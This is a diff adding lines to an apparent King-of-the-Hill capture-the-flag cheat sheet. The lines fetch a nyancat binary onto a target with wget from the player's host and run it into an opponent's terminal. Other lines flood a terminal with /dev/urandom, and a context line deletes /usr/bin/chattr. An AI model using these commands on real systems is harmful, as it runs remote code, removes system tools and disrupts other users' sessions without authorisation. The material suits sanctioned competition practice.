@@ -74,3 +74,19 @@ rm -rf /usr/bin/chattr
   ```
 # Find Flags:
 find / -name flags
+
+# Nyan-cat:
+git clone https://github.com/klange/nyancat
+cd nyancat/src
+make
+## Sending Nyancat to machine:
+python -m SimpleHTTPServer 80 # on your local machine
+
+wget http://yourip/nyancat # on the KOTH machine
+
+chmod +x nyancat
+
+./nyancat > /dev/pts/#  < here where is the # you will place the enemy PTS
+
+# Breaking pts by sending spam from urandom
+cat /dev/urandom > /dev/pts/#
